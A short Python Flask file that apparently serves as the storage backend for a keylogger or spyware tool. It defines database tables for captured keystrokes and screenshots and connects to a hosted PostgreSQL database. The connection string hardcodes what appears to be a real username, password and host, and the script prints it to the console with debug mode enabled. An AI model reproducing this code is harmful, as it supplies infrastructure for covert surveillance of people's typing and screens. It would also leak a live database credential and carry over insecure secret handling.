from flask import Flask
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import text
import os


app = Flask(__name__)


app.config["SQLALCHEMY_DATABASE_URI"] = "postgresql://neondb_owner:npg_WpoSvn9gtdE8@ep-broad-frog-a1ekybq7-pooler.ap-southeast-1.aws.neon.tech/neondb?sslmode=require"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
print("Database URI:", app.config.get("SQLALCHEMY_DATABASE_URI"))


db = SQLAlchemy(app)


class Keylog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.DateTime, default=db.func.current_timestamp())
    keystrokes = db.Column(db.Text, nullable=False)



class Screenshot(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.DateTime, default=db.func.current_timestamp())
    image_data = db.Column(db.LargeBinary, nullable=False)



with app.app_context():
    try:
        db.session.execute(text("SELECT 1 FROM keylog LIMIT 1;"))
        db.session.execute(text("SELECT 1 FROM screenshot LIMIT 1;"))
        print("✅ Connected to NeonDB. Tables exist.")
    except Exception as e:
        print(f"❌ Database Error: {e}")



if __name__ == "__main__":
    app.run(debug=True)


